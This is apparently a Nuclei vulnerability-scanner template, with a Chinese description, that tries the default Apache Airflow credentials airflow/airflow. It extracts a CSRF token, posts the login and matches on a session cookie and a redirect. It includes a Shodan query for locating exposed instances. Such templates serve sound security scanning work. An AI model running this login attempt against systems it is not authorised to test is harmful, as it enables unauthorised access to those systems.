id: airflow-default-login

info:
  name: Apache Airflow 默认口令登录（弱口令）
  author: pdteam
  severity: high
  description: 该模板通过尝试 Apache Airflow 的默认账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者可直接登录系统，进一步访问敏感信息、修改配置或执行未授权操作。
  reference:
    - https://airflow.apache.org/docs/apache-airflow/stable/start/docker.html
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  metadata:
    product: airflow
    vendor: apache
    max-request: 2
    shodan-query: title:"Sign In - Airflow"
  tags: airflow,default-login,apache,vuln

http:
  - raw:
      - |
        GET /login/ HTTP/1.1
        Host: {{Hostname}}
        Origin: {{BaseURL}}
      - |
        POST /login/ HTTP/1.1
        Host: {{Hostname}}
        Origin: {{BaseURL}}
        Content-Type: application/x-www-form-urlencoded
        Referer: {{BaseURL}}/admin/airflow/login

        username={{username}}&password={{password}}&_csrf_token={{csrf_token}}

    attack: pitchfork
    payloads:
      username:
        - airflow
      password:
        - airflow

    extractors:
      - type: regex
        name: csrf_token
        group: 1
        internal: true
        regex:
          - 'type="hidden" value="(.*?)">'

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'contains(body_1, "Sign In - Airflow")'
          - 'contains(header_2, "session=.")'
          - 'status_code_2 == 302'
        condition: and

      - type: word
        words:
          - 'You should be redirected automatically to target URL: <a href="/">'
